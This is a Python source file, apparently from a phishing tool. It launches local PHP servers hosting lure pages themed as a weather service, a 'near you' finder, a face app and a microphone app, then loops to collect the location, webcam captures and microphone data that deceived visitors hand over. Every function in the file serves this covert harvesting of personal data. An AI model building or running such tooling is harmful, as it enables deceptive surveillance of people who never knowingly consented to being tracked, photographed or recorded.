from module import localhost,banner
from module.paths import *
from module.colors import c
from module.control import kill_process

#Function For Weather Template     
def weather_info():
    localhost.run_php_server(port=localhost.randPort,dir_name="weather")
    banner.terminal_logo("Weather")
    while True:
      localhost.After_click(Ac_path=weather_temp("info"),Ac_msg="loc")
      exit_Before_click = localhost.Before_click(Bc_template=weather_temp("result"),Bc_focus="location")  
      exit_error = localhost.error_handler(weather_temp("error"))
      if exit_Before_click == "Exit" or exit_error == "Exit":
         break
      elif exit_Before_click == "continue" or exit_error == "continue":
        pass
    kill_process()

#Function For NearYou Template     
def nearyou_info():
    localhost.run_php_server(port=localhost.randPort,dir_name="nearyou")
    banner.terminal_logo("NearYou")
    while True:
     localhost.After_click(Ac_path=nearyou_temp("info"),Ac_msg="loc")
     exit_Before_click= localhost.Before_click(Bc_template=nearyou_temp("result"),Bc_focus="location")
     if exit_Before_click == "Exit":
         break
     elif exit_Before_click == "continue":
        pass
    kill_process()
 
#Function For CameraAcess Template     
def WebCamInfo():
    localhost.run_php_server(port=localhost.randPort,dir_name="camera_temp")
    banner.terminal_logo("WebCam")
    while True:
     localhost.After_click(Ac_path=webcam_temp("face-app-info"),Ac_msg="webcam")
     exit_Before_click = localhost.Before_click(Bc_template=webcam_temp("face-app-result"),Bc_focus="webcam")
     if exit_Before_click == "Exit":
       break
     elif exit_Before_click == "continue":
        pass
    kill_process()
    
#Function For Microphone AcessTemplate     
def MicrophoneInfo():
    localhost.run_php_server(port=localhost.randPort,dir_name="microphone")
    banner.terminal_logo("Microphone")
    while True:
     localhost.After_click(Ac_path=microphone_temp("microphone-info"),Ac_msg="mic") 
     exit_Before_click = localhost.Before_click(Bc_template=microphone_temp("microphone-result"),Bc_focus="microphone")
     if exit_Before_click == "Exit":
       break
     elif exit_Before_click == "continue":
       pass
    kill_process()
